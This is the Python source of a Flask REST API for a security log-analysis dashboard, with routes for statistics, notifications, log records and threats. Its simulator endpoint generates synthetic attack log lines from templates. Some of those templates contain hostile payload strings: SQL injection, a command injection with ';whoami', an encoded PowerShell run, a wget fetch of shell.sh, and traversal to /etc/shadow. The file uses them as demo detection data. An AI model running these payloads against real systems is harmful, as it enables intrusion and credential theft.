"""REST API routes"""
import json
from flask import Blueprint, jsonify, request
from aegis_core.analytics.mitre_matrix import MITRE_TECHNIQUES
from aegis_core.config import Settings
from aegis_core.persistence.engine import get_db
from aegis_core.security.identity import login_required, get_current_user

api_bp = Blueprint("api", __name__, url_prefix="/api")


def _login_required_api(f):
    """API version of login_required that returns JSON errors"""
    from functools import wraps
    @wraps(f)
    def wrapper(*args, **kwargs):
        user = get_current_user()
        if not user:
            return jsonify({"error": "Authentication required"}), 401
        return f(*args, **kwargs)
    return wrapper


@api_bp.route("/dashboard/stats")
@_login_required_api
def dashboard_stats():
    user = get_current_user()
    with get_db() as conn:
        total_logs = conn.execute("SELECT COUNT(*) c FROM log_records").fetchone()["c"]
        total_threats = conn.execute("SELECT COUNT(*) c FROM threats").fetchone()["c"]
        active_incidents = conn.execute("SELECT COUNT(*) c FROM incidents WHERE status NOT IN ('resolved','closed')").fetchone()["c"]
        total_files = conn.execute("SELECT COUNT(*) c FROM log_files WHERE status = 'indexed'").fetchone()["c"]
        critical = conn.execute("SELECT COUNT(*) c FROM threats WHERE severity = 'Critical'").fetchone()["c"]
        avg_score = conn.execute("SELECT COALESCE(AVG(score),0) c FROM threats").fetchone()["c"]

        # Severity distribution for chart
        sev = conn.execute("SELECT severity, COUNT(*) c FROM threats GROUP BY severity").fetchall()
        sev_data = {r["severity"]: r["c"] for r in sev}

    return jsonify({
        "total_logs": total_logs,
        "total_threats": total_threats,
        "active_incidents": active_incidents,
        "total_files": total_files,
        "critical_count": critical,
        "avg_threat_score": round(float(avg_score), 1),
        "severity_dist": sev_data,
    })


@api_bp.route("/notifications")
@_login_required_api
def get_notifications():
    user = get_current_user()
    with get_db() as conn:
        rows = conn.execute(
            """SELECT notif_id, message, level, read, created_at
               FROM notifications WHERE user_id = ? ORDER BY created_at DESC LIMIT 10""",
            (user.user_id,)
        ).fetchall()
        unread = conn.execute(
            "SELECT COUNT(*) c FROM notifications WHERE user_id = ? AND read = 0",
            (user.user_id,)
        ).fetchone()["c"]
    return jsonify({"notifications": [dict(r) for r in rows], "unread_count": unread})


@api_bp.route("/notifications/mark-read", methods=["POST"])
@_login_required_api
def mark_notifications_read():
    user = get_current_user()
    with get_db() as conn:
        conn.execute("UPDATE notifications SET read = 1 WHERE user_id = ?", (user.user_id,))
    return jsonify({"ok": True})


@api_bp.route("/files/<int:file_id>/records")
@_login_required_api
def file_records(file_id: int):
    user = get_current_user()
    page = max(1, request.args.get("page", 1, type=int))
    per_page = min(100, request.args.get("per_page", 50, type=int))
    severity = request.args.get("severity", "")
    search = request.args.get("q", "")

    with get_db() as conn:
        file_rec = conn.execute(
            "SELECT file_id FROM log_files WHERE file_id = ? AND user_id = ?",
            (file_id, user.user_id)
        ).fetchone()
        if not file_rec:
            return jsonify({"error": "File not found"}), 404

        query = "SELECT * FROM log_records WHERE file_id = ?"
        params = [file_id]
        if search:
            query += " AND (message LIKE ? OR source_ip LIKE ?)"
            params.extend([f"%{search}%", f"%{search}%"])
        query += f" ORDER BY record_id ASC LIMIT ? OFFSET ?"
        params.extend([per_page, (page - 1) * per_page])

        records = conn.execute(query, params).fetchall()
        total = conn.execute(
            "SELECT COUNT(*) c FROM log_records WHERE file_id = ?", (file_id,)
        ).fetchone()["c"]

    return jsonify({
        "records": [dict(r) for r in records],
        "total": total,
        "page": page,
        "per_page": per_page,
    })


@api_bp.route("/files/<int:file_id>/threats")
@_login_required_api
def file_threats(file_id: int):
    user = get_current_user()
    with get_db() as conn:
        file_rec = conn.execute(
            "SELECT file_id FROM log_files WHERE file_id = ? AND user_id = ?",
            (file_id, user.user_id)
        ).fetchone()
        if not file_rec:
            return jsonify({"error": "File not found"}), 404

        threats = conn.execute(
            """SELECT t.*, r.source_ip, r.resource, r.timestamp
               FROM threats t LEFT JOIN log_records r ON r.record_id = t.record_id
               WHERE t.file_id = ? ORDER BY t.score DESC""",
            (file_id,)
        ).fetchall()

    return jsonify({"threats": [dict(t) for t in threats]})


@api_bp.route("/simulator/generate", methods=["POST"])
@_login_required_api
def simulator_generate():
    """Generate synthetic attack log events for demonstration"""
    user = get_current_user()
    event_type = request.json.get("event_type", "brute_force") if request.is_json else "brute_force"

    import random
    import time

    ATTACK_TEMPLATES = {
        "brute_force": {
            "technique_id": "T1110", "severity": "Critical", "category": "Credential Access",
            "score": random.randint(80, 98),
            "messages": [
                "Failed password for root from 192.168.{}.{} port {} ssh2",
                "authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={}",
                "Invalid user admin from {}.{}.{}.{}"
            ]
        },
        "sql_injection": {
            "technique_id": "T1190", "severity": "Critical", "category": "Exploit Payload",
            "score": random.randint(88, 99),
            "messages": [
                "GET /search?q=' OR '1'='1 HTTP/1.1 500 - 192.168.{}.{}",
                "POST /login [SQLMAP] union select 1,2,3-- - 403",
                "SQL error: You have an error in your SQL syntax near 'OR 1=1'"
            ]
        },
        "suspicious_login": {
            "technique_id": "T1078", "severity": "High", "category": "Defense Evasion",
            "score": random.randint(70, 85),
            "messages": [
                "Accepted password for admin from {}.{}.{}.{} port {} ssh2",
                "New session opened for user admin from unknown location",
                "Login successful from anomalous geolocation: {}.{}.{}.{}"
            ]
        },
        "privilege_escalation": {
            "technique_id": "T1055", "severity": "Critical", "category": "Privilege Escalation",
            "score": random.randint(85, 96),
            "messages": [
                "sudo: user www-data : command allowed ; USER=root ; COMMAND=/bin/bash",
                "Process injection detected in PID {}",
                "Privilege escalation attempt: setuid binary execution"
            ]
        },
        "port_scan": {
            "technique_id": "T1046", "severity": "High", "category": "Reconnaissance",
            "score": random.randint(65, 80),
            "messages": [
                "Connection attempt on port {} from {}.{}.{}.{}",
                "Nmap scan detected from {}.{}.{}.{}: {} ports probed",
                "Excessive connection attempts: {} requests in 10 seconds"
            ]
        },
        "command_injection": {
            "technique_id": "T1059", "severity": "Critical", "category": "Execution",
            "score": random.randint(88, 99),
            "messages": [
                "GET /api/ping?host=127.0.0.1;whoami HTTP/1.1 200",
                "Command injection: cmd=powershell -enc {} executed",
                "Shell execution detected: /bin/bash -c 'wget http://{}.{}.{}.{}/shell.sh'"
            ]
        },
        "malware_detection": {
            "technique_id": "T1005", "severity": "Critical", "category": "Collection",
            "score": random.randint(90, 99),
            "messages": [
                "Malware signature detected: Trojan.Gen.2 in /tmp/{}",
                "Suspicious file execution: .exe dropped in temp directory",
                "AV alert: Ransomware behavior detected - mass file encryption"
            ]
        },
        "suspicious_file_access": {
            "technique_id": "T1083", "severity": "High", "category": "Discovery",
            "score": random.randint(65, 82),
            "messages": [
                "Unauthorized access to /etc/passwd from process {}",
                "Mass file read: {} files accessed in 5 seconds by user {}",
                "Sensitive directory traversal: ../../../etc/shadow"
            ]
        },
        "data_exfiltration": {
            "technique_id": "T1071", "severity": "Critical", "category": "Command and Control",
            "score": random.randint(85, 97),
            "messages": [
                "Large outbound transfer: {}MB to {}.{}.{}.{} on port 443",
                "Unusual DNS query volume: {} queries to external resolver",
                "HTTP POST {} bytes to unknown external endpoint {}.{}.{}.{}"
            ]
        },
        "account_anomaly": {
            "technique_id": "T1078", "severity": "High", "category": "Defense Evasion",
            "score": random.randint(70, 88),
            "messages": [
                "Account {} locked after {} failed attempts",
                "Multiple simultaneous sessions for user {} from different IPs",
                "Off-hours access: user {} logged in at {}"
            ]
        },
    }

    template = ATTACK_TEMPLATES.get(event_type, ATTACK_TEMPLATES["brute_force"])
    r = random.randint
    ip = f"{r(10,220)}.{r(0,255)}.{r(0,255)}.{r(1,254)}"
    msg = random.choice(template["messages"]).format(
        r(1,255), r(1,254), r(1024,65535), r(1,254), r(100,9999), "admin", r(1,99)
    )

    # Create a synthetic file entry for simulation
    with get_db() as conn:
        # Check if there's a simulation file for this user
        sim_file = conn.execute(
            "SELECT file_id FROM log_files WHERE user_id = ? AND filename LIKE 'SIMULATION%' AND status = 'indexed' ORDER BY uploaded_at DESC LIMIT 1",
            (user.user_id,)
        ).fetchone()

        if not sim_file:
            cursor = conn.execute(
                """INSERT INTO log_files (user_id, filename, file_size, file_ext, sha256, status, uploaded_at)
                   VALUES (?,?,?,?,?,?,?)""",
                (user.user_id, f"SIMULATION-SESSION-{int(time.time())}.log", 0, "log",
                 "sim-" + str(int(time.time())), "indexed", Settings.now_utc())
            )
            file_id = cursor.lastrowid
        else:
            file_id = sim_file["file_id"]

        cursor = conn.execute(
            """INSERT INTO log_records (file_id, timestamp, source_ip, event_type, message, raw_line)
               VALUES (?,?,?,?,?,?)""",
            (file_id, Settings.now_utc(), ip, template["category"], msg, msg)
        )
        record_id = cursor.lastrowid

        threat_cursor = conn.execute(
            """INSERT INTO threats (record_id, file_id, severity, score, ml_score, category,
               technique_id, finding, confidence, detected_at)
               VALUES (?,?,?,?,?,?,?,?,?,?)""",
            (record_id, file_id, template["severity"], template["score"],
             random.randint(60, 95), template["category"],
             template["technique_id"],
             f"Simulated {event_type.replace('_',' ').title()} event detected.",
             random.randint(75, 95), Settings.now_utc())
        )
        threat_id = threat_cursor.lastrowid

        # Update file stats
        conn.execute(
            """UPDATE log_files SET record_count = record_count + 1, threat_count = threat_count + 1
               WHERE file_id = ?""",
            (file_id,)
        )

    return jsonify({
        "ok": True,
        "event": {
            "record_id": record_id,
            "threat_id": threat_id,
            "file_id": file_id,
            "event_type": event_type,
            "technique_id": template["technique_id"],
            "severity": template["severity"],
            "score": template["score"],
            "category": template["category"],
            "message": msg,
            "source_ip": ip,
            "timestamp": Settings.now_utc(),
        }
    })


@api_bp.route("/health")
def health():
    return jsonify({"status": "ok", "version": Settings.APP_VERSION, "app": Settings.APP_NAME})
